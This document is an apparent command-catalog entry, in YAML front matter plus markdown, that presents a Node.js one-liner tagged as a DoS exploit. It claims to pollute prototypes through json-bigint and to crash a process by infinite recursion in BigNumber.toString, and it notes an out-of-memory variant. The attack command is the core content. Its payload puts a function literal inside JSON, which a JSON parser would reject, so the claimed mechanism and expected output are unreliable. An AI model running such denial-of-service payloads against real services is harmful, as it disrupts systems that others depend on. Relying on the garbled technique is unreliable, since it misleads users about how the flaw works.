---
id: cmd-uuid-3
data: >-
  node -e "const JSONbig = require('json-bigint'); const BigNumber =
  require('bignumber.js'); const maliciousJSON =
  '{\"__proto__\":{\"toString\":function f(){f();return \"\";}}}';
  JSONbig.parse(maliciousJSON); const bn = new BigNumber('1');
  console.log(bn.toString());"
tags:
  - dos
  - exploit
  - node-js
type: command
output: null
executor: bash
platforms:
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.295Z'
verified: false
validated: true
submitted: true
---
# node-parse-malicious-json

## Command

```bash
node -e "const JSONbig = require('json-bigint'); const BigNumber = require('bignumber.js'); const maliciousJSON = '{\"__proto__\":{\"toString\":function f(){f();return \"\";}}}'; JSONbig.parse(maliciousJSON); const bn = new BigNumber('1'); console.log(bn.toString());"
```

## Description

Runs a Node.js script that parses a malicious JSON payload using json-bigint to pollute prototypes, then triggers DoS by calling toString on a BigNumber instance, causing infinite recursion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-e` | Inline JavaScript exploiting the vulnerability | Yes |

## Examples

### Basic Usage

```bash
node -e "..." # As above
```

### Advanced Usage

```bash
node -e "... with different payload for OOM"
```

## Expected Output

Process hangs due to infinite loop in toString, or throws OOM error; no console output after parse.

## Related

- [[Related Procedure]]
